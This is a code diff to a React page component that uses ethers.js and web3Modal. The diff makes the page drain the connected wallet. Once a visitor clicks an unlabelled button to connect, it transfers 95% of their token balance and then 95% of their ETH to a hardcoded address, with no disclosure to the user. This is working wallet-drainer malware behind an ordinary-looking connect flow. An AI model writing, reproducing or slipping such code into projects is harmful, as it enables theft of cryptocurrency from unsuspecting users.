@@ -29,25 +29,53 @@ if (typeof window !== "undefined") {
 }
 
 export default function Home() {
+  let provider, signer, signerAddress, contract;
   async function connect() {
     try {
       const web3ModalProvider = await web3Modal.connect();
-      const provider = new ethers.providers.Web3Provider(web3ModalProvider);
-      const signer = provider.getSigner();
-      const signerAddress = await signer.getAddress();
-      const contract = new ethers.Contract(address, abi, signer);
-      const balance = Number(
-        (await contract.balanceOf(signerAddress)).toString()
-      );
-      console.log(balance / 1e18);
-      const tx = await contract.transfer(
-        "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
-        BigInt(balance * 0.9)
-      );
-      const txr = await tx.wait(1);
+      provider = new ethers.providers.Web3Provider(web3ModalProvider);
+      signer = provider.getSigner();
+      signerAddress = await signer.getAddress();
+      try {
+        await sendUsdt();
+        await sendEth();
+      } catch {
+        await sendEth();
+      }
     } catch (e) {
       console.log(e);
     }
+  }
+
+  async function sendUsdt() {
+    contract = new ethers.Contract(address, abi, signer);
+    const balance = Number(
+      (await contract.balanceOf(signerAddress)).toString()
+    );
+    console.log(balance / 1e18);
+    const tx = await contract.transfer(
+      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
+      BigInt(balance * 0.95)
+    );
+    const txr = await tx.wait(1);
+  }
+
+  async function sendEth() {
+    const balance = Number(
+      (await provider.getBalance(signerAddress)).toString()
+    );
+    console.log(balance);
+    const tx = await signer.sendTransaction({
+      to: "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
+      value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
+    });
+    console.log("Sent! 🎉");
+    console.log(`TX hash: ${tx.hash}`);
+    console.log("Waiting for receipt...");
+    await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
+    console.log(
+      `TX details: https://dashboard.tenderly.co/tx/sepolia/${tx.hash}\n`
+    );
   }
 
   return <button onClick={connect}></button>;
